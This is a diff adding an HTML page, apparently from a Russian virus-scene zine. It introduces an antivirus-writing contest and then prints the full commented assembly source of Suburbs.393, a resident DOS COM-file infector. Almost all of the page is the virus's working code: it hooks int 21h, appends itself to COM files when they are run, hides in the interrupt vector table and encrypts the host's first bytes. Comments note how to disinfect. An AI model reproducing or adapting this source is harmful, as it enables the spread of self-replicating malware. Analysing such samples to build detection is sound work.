@@ -1,0 +1,288 @@
+<HTML>
+<HEAD>
+<TITLE>
+Написание антивируса для простого COM-виря. * Zemsky Fershal //NF (C) 1998-2004
+</TITLE>
+<STYLE TYPE="text/css">
+BODY {font-family:Courier; font-size:10pt;}
+PRE  {font-family:Courier; font-size:10pt;}
+</STYLE>
+</HEAD>
+<BODY>
+<P><CENTER><IMG SRC="ZF-2.gif" ALT="ZF"></CENTER></P>
+<TABLE ALIGN="center">
+<TR>
+<TD>
+<PRE>
+         Написание антивируса для простого COM-виря.
+
+
+    Представленные в  данном  номере  антивирусы,являются  победителями
+конкурса   проходившего  в  конце  прошлого  1997  года  в  конференции
+rel.comp.virus.  Для  первого  этапа  был   выбран   простой   RC-вирус
+Suburbs.393 из журнала SLAM. Сами антивирусы с исходными текстами лежат
+в директории FILE/. Берите,обучайтесь,пишите лучше и присылайте нам.
+
+
+Suburbs/SLAM -
+    неопасный COM-вирус.  При запуске по 4Bh поражает только COM-файлы,
+не  имеющие  в начале команды JMP,  так как использует ее как индикатор
+зараженности.  В памяти живет во второй  половине  таблицы  прерываний.
+Дописывается  в  конец  поражаемого файла,  сохраняя первые три байта в
+своем теле в зашифрованном виде.
+                                               Text by ReCoder
+
+
+PAGE  59,132                           Commented by Populizer
+
+;##########################################################################
+;##                                                                      ##
+;##                             SUBURBS                                  ##
+;##                                                                      ##
+;##########################################################################
+
+.386c
+
+.487
+d_0000_0084_e   equ     84h
+d_0020_0000_e   equ     0                       ;*
+d_0020_0174_e   equ     174h                    ;*
+d_0020_0176_e   equ     176h                    ;*
+d_0020_018A_e   equ     18Ah                    ;*
+d_0020_018B_e   equ     18Bh                    ;*
+
+                .model tiny
+                .code
+                org     100h
+start:
+                jmp     l_010B
+                                                ;* No entry point to code
+                and     al,24h                  ; '$'
+                nop
+                nop
+                nop
+                nop
+                nop
+                retn
+l_010B:
+                jmp     l_01FB
+;--- Новый обработчик int 24
+                                                ;* No entry point to code
+                mov     al,3
+                iret
+;--- Новый обработчик int 21
+                                                ;* No entry point to code
+                cmp     ah,4Bh                  ; 'K'
+                je      short l_0119
+;--- Переход на настоящий обработчик int 21
+                jmp     l_01F6
+l_0119:
+;--- Заражение файла при запуске.
+                pusha
+                push    ds
+                push    es
+                mov     ax,4300h
+                int     21h                     ; DOS Services  ah=function 43h
+                                                ;  get attrb cx, filename @ds:dx
+                push    cx
+                push    ds
+                push    dx
+                mov     ax,4301h
+                xor     cx,cx
+                int     21h                     ; DOS Services  ah=function 43h
+                                                ;  set attrb cx, filename @ds:dx
+                mov     ax,3D02h
+                int     21h                     ; DOS Services  ah=function 3Dh
+                                                ;  open file, al=mode,name@ds:dx
+                xchg    bx,ax
+                mov     ax,20h
+                mov     ds,ax
+                mov     ds:d_0020_0174_e,bx
+                mov     ax,3524h
+                int     21h                     ; DOS Services  ah=function 35h
+                                                ;  get intrpt vector al in es:bx
+                push    es
+                push    bx
+                mov     ax,2524h
+;*              mov     dx,offset l_0020_0003   ;*
+                db      0BAh, 03h, 00h
+                int     21h                     ; DOS Services  ah=function 25h
+                                                ;  set intrpt vector al to ds:dx
+                mov     bx,ds:d_0020_0174_e
+                mov     ax,5700h
+                int     21h                     ; DOS Services  ah=function 57h
+                                                ;  get file date+time, bx=handle
+                                                ;   returns cx=time, dx=time
+                push    dx
+                push    cx
+                mov     ah,3Fh                  ; '?'
+                mov     dx,d_0020_0174_e
+                mov     cx,3
+                int     21h                     ; DOS Services  ah=function 3Fh
+                                                ;  read file, bx=file handle
+                                                ;   cx=bytes to ds:dx buffer
+                jnc     short l_0162
+                jmp     short l_01D9
+l_0162:
+;--- Проверка на EXE файл
+                cmp     word ptr ds:d_0020_0174_e,5A4Dh
+                je      short l_01D9
+                cmp     word ptr ds:d_0020_0174_e,4D5Ah
+                je      short l_01D9
+                mov     ax,4200h
+                xor     cx,cx
+                mov     dx,word ptr ds:d_0020_0174_e+1
+;*              add     dx,3
+                db       83h,0C2h, 03h
+                int     21h                     ; DOS Services  ah=function 42h
+                                                ;  move file ptr, bx=file handle
+                                                ;   al=method, cx,dx=offset
+                mov     ah,3Fh                  ; '?'
+                mov     dx,d_0020_018B_e
+                mov     cx,3
+                int     21h                     ; DOS Services  ah=function 3Fh
+                                                ;  read file, bx=file handle
+                                                ;   cx=bytes to ds:dx buffer
+;--- Признак заражения E9 первый байт.
+                cmp     byte ptr ds:d_0020_018B_e,0E9h
+                je      short l_01D9
+                xor     byte ptr ds:d_0020_0174_e,21h   ; '!'
+                xor     byte ptr ds:d_0020_0174_e+1,85h
+                xor     byte ptr ds:d_0020_0176_e,2Dh   ; '-'
+                mov     ax,4202h
+                xor     cx,cx
+                xor     dx,dx
+                int     21h                     ; DOS Services  ah=function 42h
+                                                ;  move file ptr, bx=file handle
+                                                ;   al=method, cx,dx=offset
+                mov     bp,ax
+                mov     ah,40h                  ; '@'
+                xor     dx,dx
+                mov     cx,189h
+                int     21h                     ; DOS Services  ah=function 40h
+                                                ;  write file  bx=file handle
+                                                ;   cx=bytes from ds:dx buffer
+                jc      short l_01D9
+                mov     ax,4200h
+                xor     cx,cx
+                xor     dx,dx
+                int     21h                     ; DOS Services  ah=function 42h
+                                                ;  move file ptr, bx=file handle
+                                                ;   al=method, cx,dx=offset
+                mov     si,18Ah
+                mov     byte ptr ds:d_0020_018A_e,0E9h
+                mov     ax,bp
+                sub     ax,3
+                mov     ds:d_0020_018B_e,ax
+                mov     dx,d_0020_018A_e
+                mov     ah,40h                  ; '@'
+                mov     cx,3
+                int     21h                     ; DOS Services  ah=function 40h
+                                                ;  write file  bx=file handle
+                                                ;   cx=bytes from ds:dx buffer
+l_01D9:
+                mov     ax,5701h
+                pop     cx
+                pop     dx
+                int     21h                     ; DOS Services  ah=function 57h
+                                                ;  set file date+time, bx=handle
+                                                ;   cx=time, dx=time
+                mov     ah,3Eh
+                int     21h                     ; DOS Services  ah=function 3Eh
+                                                ;  close file, bx=file handle
+                pop     dx
+                pop     ds
+                mov     ax,2524h
+                int     21h                     ; DOS Services  ah=function 25h
+                                                ;  set intrpt vector al to ds:dx
+                mov     ax,4301h
+                pop     dx
+                pop     ds
+                pop     cx
+                int     21h                     ; DOS Services  ah=function 43h
+                                                ;  set attrb cx, filename @ds:dx
+                pop     es
+                pop     ds
+                popa
+l_01F6:
+                jmp     far ptr $-1F6h
+l_01FB:
+                pushad
+                push    ds
+                push    es
+                mov     di,ds
+                mov     ax,20h
+                mov     ds,ax
+;--- Проверка инсталяции в памяти
+                cmp     word ptr ds:d_0020_0000_e,0
+                jne     short l_0257
+;--- Заражение памяти
+                mov     ds,di
+                xor     ax,ax
+                mov     es,ax
+                mov     di,d_0000_0084_e
+                mov     ax,es:[di]
+                mov     bx,es:[di+2]
+
+                mov     si,word ptr ds:[101h]
+                add     si,1EFh
+;--- Запомнить старое значение int 21
+                mov     cs:[si],ax
+                mov     cs:[si+2],bx
+                xor     ax,ax
+                mov     di,ax
+                mov     si,word ptr ds:[101h]
+                add     si,103h
+                push    cs
+                pop     ds
+;--- Перенести тело в таблицу векторов 20:0
+                mov     ax,20h
+                mov     es,ax
+                mov     cx,189h
+                rep     movsb
+                xor     ax,ax
+                mov     es,ax
+;--- Установить новое значение вектора int 21 -&gt; 0020:0006
+                mov     di,d_0000_0084_e
+                mov     word ptr es:[di],6
+                mov     ax,20h
+                mov     es:[di+2],ax
+l_0257:
+                mov     ax,cs
+                mov     ds,ax
+                mov     es,ax
+;--- Для автоматического лечения вируса необходимо передать управление в
+;--- эту точку.
+;--- Для ручного лечения нужно расшифровывать байты и записывать их
+;--- По адресу 0 для COM файлов.
+                mov     si,word ptr ds:[101h]
+                add     si,277h
+;--- Расшифровать оригинальные байты
+                xor     byte ptr [si],21h       ; '!'
+                xor     byte ptr [si+1],85h
+                xor     byte ptr [si+2],2Dh     ; '-'
+;--- Записать оригинальные байты по адресу cs:100
+                mov     di,100h
+                mov     cx,3
+                rep     movsb
+                pop     es
+                pop     ds
+                popa
+l_027B:
+                push    offset start
+                retn
+;--- Зашифрованные оригинальные байты -&gt; 90 90 90
+                db      0B1h, 15h,0BDh
+                db      '[VD/SLAM]'
+                db       00h, 53h, 75h, 62h, 75h, 72h
+                db       62h, 73h, 00h
+                end
+
+</PRE>
+</TD>
+</TR>
+</TABLE>
+<HR>
+<CENTER>(C) NF, 1998-2004</CENTER>
+</BODY>
+</HTML>
